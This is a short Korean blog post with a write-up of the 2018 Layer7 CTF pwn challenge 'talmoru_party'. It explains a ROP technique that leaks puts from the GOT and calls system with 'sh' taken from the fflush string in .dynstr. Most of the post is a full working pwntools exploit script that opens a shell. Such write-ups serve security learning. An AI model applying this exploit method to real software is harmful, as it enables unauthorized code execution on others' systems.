---
title: "2018 Layer7 CTF talmoru_party!~"
date: 2019-11-4
tags: [Layer7]
categories: [Pwn]
---

2018년 Layer7 CTF에 출제된 문제이다. 

일반적인 ROP다. 근데 함수중에 fflush가 사용된 것을 보고 .dynstr에 적재된 fflush함수의 뒤 두 글자 `sh` 를 넣어주고 익스했다. 

`objdump -h BINARY` 로 섹션 헤더를 보면 .dynstr 주소 값을 gdb로 보면 함수 이름들이 있는 것을 알 수 있다.

그래서 `system("/bin/sh")` 해주지 않아도 `system("sh")` 로 쉘을 흭득할 수 있다.

```python
from pwn import *
 
e = ELF('./talmo_party')
r = ROP(e)
#libc = ELF('./layer7.so.6')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = process('./talmo_party')
 
vuln = 0x80486e0
puts_plt = e.plt['puts']
puts_got = e.got['puts']
 
p.sendlineafter('>>','3')
 
payload = 'A'*(0x40+4)
r.puts(puts_got)
r.raw(vuln)
payload += str(r)
p.sendline(payload)
p.recvuntil('~~!\n')
 
libc_base = u32(p.recv(4)) - libc.symbols['puts']
system = libc_base + libc.symbols['system']
log.info('libcbase : ' +hex(libc_base))
 
pay2 = 'A'*(0x40+4)
pay2 += p32(system)
pay2 += 'AAAA'
pay2 += p32(0x80482da) # .dynstr -> fflush -> sh get
#pay2 += p32(libc_base+list(libc.search('/bin/sh'))[0])
p.sendline(pay2)
 
p.interactive()
```

